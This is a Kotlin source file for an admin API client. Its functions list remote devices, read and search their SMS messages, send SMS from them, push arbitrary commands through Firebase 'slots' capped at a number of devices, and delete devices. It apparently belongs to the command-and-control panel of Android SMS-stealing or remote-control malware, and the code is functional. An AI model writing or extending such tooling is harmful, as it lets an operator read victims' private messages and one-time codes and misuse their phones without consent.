package com.boom.admin.api

import com.boom.admin.utils.Session
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object AdminApi {

    private fun request(method: String, path: String, body: JSONObject? = null): JSONObject? {
        return try {
            val url = URL("${Session.serverUrl}$path")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.connectTimeout = 15_000
            conn.readTimeout = 15_000
            conn.setRequestProperty("Content-Type", "application/json")
            if (Session.token.isNotEmpty()) conn.setRequestProperty("Authorization", "Bearer ${Session.token}")
            if (body != null) {
                conn.doOutput = true
                OutputStreamWriter(conn.outputStream).use { it.write(body.toString()) }
            }
            if (conn.responseCode in 200..299) JSONObject(conn.inputStream.bufferedReader().readText())
            else null
        } catch (e: Exception) { null }
    }

    private fun requestArray(path: String): JSONArray? {
        return try {
            val url = URL("${Session.serverUrl}$path")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 15_000
            conn.setRequestProperty("Authorization", "Bearer ${Session.token}")
            if (conn.responseCode in 200..299) {
                val text = conn.inputStream.bufferedReader().readText()
                try { JSONArray(text) } catch (e: Exception) { JSONObject(text).optJSONArray("devices") ?: JSONArray() }
            } else null
        } catch (e: Exception) { null }
    }

    fun login(username: String, password: String) = request("POST", "/api/auth/login",
        JSONObject().apply { put("username", username); put("password", password) })

    fun getDevices(page: Int = 1, search: String = "") =
        request("GET", "/api/devices?page=$page&limit=50${if (search.isNotEmpty()) "&search=$search" else ""}")

    fun getDeviceStats() = request("GET", "/api/devices/stats")

    fun getSms(deviceId: String, page: Int = 1) = request("GET", "/api/sms/$deviceId?page=$page&limit=100")

    fun searchSms(query: String) = request("GET", "/api/sms?q=$query")

    fun sendSms(deviceId: String, to: String, body: String) = request("POST", "/api/sms/send",
        JSONObject().apply { put("deviceId", deviceId); put("to", to); put("body", body) })

    fun getFirebaseSlots(): JSONArray? = requestArray("/api/firebase")

    fun addFirebaseSlot(name: String, projectId: String, serviceAccountJson: String, maxDevices: Int) =
        request("POST", "/api/firebase", JSONObject().apply {
            put("name", name); put("projectId", projectId)
            put("serviceAccountJson", JSONObject(serviceAccountJson)); put("maxDevices", maxDevices)
        })

    fun sendCommand(deviceId: String, type: String, payload: JSONObject = JSONObject()) =
        request("POST", "/api/devices/$deviceId/command",
            JSONObject().apply { put("type", type); put("payload", payload) })

    fun deleteDevice(deviceId: String) = request("DELETE", "/api/devices/$deviceId")
}
